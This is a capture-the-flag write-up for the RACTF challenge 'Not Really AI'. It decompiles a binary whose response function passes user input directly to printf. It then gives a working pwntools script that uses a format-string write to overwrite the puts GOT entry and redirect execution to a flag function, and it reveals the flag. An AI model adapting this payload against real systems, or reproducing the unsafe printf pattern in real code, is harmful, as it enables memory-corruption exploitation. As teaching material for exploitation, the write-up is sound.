# Not Really AI

> Exploit the service to get the flag.

## Description

Let's decompile the binary with Ghidra. The `main` function calls the following function:

```c
void response(void)
{
  char local_20c [516];
  
  puts("How are you finding RACTF?");
  fgets(local_20c,0x200,stdin);
  puts("I am glad you");
  printf(local_20c);
  puts("\nWe hope you keep going!");
  return;
}
```

There also is a function `flaggy` which discloses the flag. We can enter a string in a buffer, which is not vulnerable to buffer overflow, but then its content is printed using `printf`: this is a format string vulnerability.

## Solution

Using `checksec` on the binary, we see that PIE is not enabled. Therefore we overwrite the GOT entry of `puts` with the address of `flaggy`.

```python
from pwn import *

sh = remote('88.198.219.20', 34015)

puts_plt = 0x804c018
# flaggy = 0x08049245

print(sh.recvuntil("RACTF?").decode())

offset = 4
payload = p32(puts_plt) + p32(puts_plt + 2) + "%{}p%{}$hn%{}p%{}$hn\x00".format(0x804-8, offset+1, 0x9245-0x804, offset).encode()

sh.sendline(payload)

sh.interactive()
```

Flag: `ractf{f0rmat_Str1nG_fuN}`